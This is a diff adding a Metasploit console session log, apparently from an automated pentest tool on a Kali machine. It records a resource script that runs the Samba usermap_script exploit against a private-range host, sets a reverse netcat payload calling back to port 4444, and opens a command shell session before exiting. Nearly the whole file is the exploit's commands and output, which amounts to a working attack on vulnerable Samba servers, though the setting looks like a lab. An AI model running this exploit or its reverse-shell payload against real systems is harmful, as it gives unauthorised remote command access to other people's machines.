@@ -1,0 +1,33 @@
+[1m[34m[*][0m Spooling to file /home/kali/forcevector/logs/sessions/msfconsole_transcript_192.168.139.128_20260710_071022.txt...
+resource (/tmp/tmpyeumtgzj.rc)> setg SessionLogging true
+[0mSession logging enabled.
+SessionLogging => true
+resource (/tmp/tmpyeumtgzj.rc)> setg ConsoleLogging true
+[0mConsole logging is now enabled.
+ConsoleLogging => true
+resource (/tmp/tmpyeumtgzj.rc)> setg ExitOnSession false
+[0mExitOnSession => false
+resource (/tmp/tmpyeumtgzj.rc)> use exploits/multi/samba/usermap_script
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/reverse_netcat
+resource (/tmp/tmpyeumtgzj.rc)> set RHOST 192.168.139.128
+[0mRHOST => 192.168.139.128
+resource (/tmp/tmpyeumtgzj.rc)> set LHOST 192.168.139.129
+[0mLHOST => 192.168.139.129
+resource (/tmp/tmpyeumtgzj.rc)> set LPORT 4444
+[0mLPORT => 4444
+resource (/tmp/tmpyeumtgzj.rc)> set SMBPIPE \\\\.\\pipe\\browser
+[0m[1m[33m[!][0m Unknown datastore option: SMBPIPE.
+SMBPIPE => \\.\pipe\browser
+resource (/tmp/tmpyeumtgzj.rc)> set SMBUSER administrator
+[0mSMBUSER => administrator
+resource (/tmp/tmpyeumtgzj.rc)> set SMBPASS ""
+[0mSMBPASS => 
+resource (/tmp/tmpyeumtgzj.rc)> exploit
+[0m[1m[34m[*][0m Started reverse TCP handler on 192.168.139.129:4444 
+[1m[34m[*][0m Command shell session 1 opened (192.168.139.129:4444 -> 192.168.139.128:57993) at 2026-07-10 07:10:36 -0400
+
+[0m
+Abort session 1? [y/N]  
+[1m[34m[*][0m 192.168.139.128 - Command shell session 1 closed.  Reason: User exit
+[?1034h[4mmsf[0m exploit([1m[31mmulti/samba/usermap_script[0m) [0m> exit
+[0m
